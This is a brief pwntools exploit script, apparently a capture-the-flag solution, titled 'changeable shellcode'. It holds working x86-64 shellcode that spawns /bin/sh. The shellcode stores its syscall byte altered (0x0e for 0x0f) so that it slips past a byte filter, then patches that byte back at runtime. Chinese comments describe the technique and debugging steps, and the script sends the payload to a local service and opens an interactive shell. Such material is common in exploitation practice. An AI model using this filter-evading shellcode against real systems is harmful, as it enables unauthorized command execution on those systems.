# changeable shellcode

```py
from pwn import *
context.arch='amd64'
"""
add rdx,0x1b
add byte ptr [rdx],0x1  [rdx+0x1b]是下面syscall的地址。可在call shellcode那里下个断点，gdb看那里的寄存器值

xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall

syscall最后的\x0f\x05换成\x0e\x05,然后shellcode开始时将\x0e加回\x0f
"""
shellcode=shellcode=b"\x48\x83\xC2\x1B\x80\x02\x01\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0e\x05"
p=remote("localhost",50879)
p.sendlineafter(": ",shellcode)
p.interactive()
```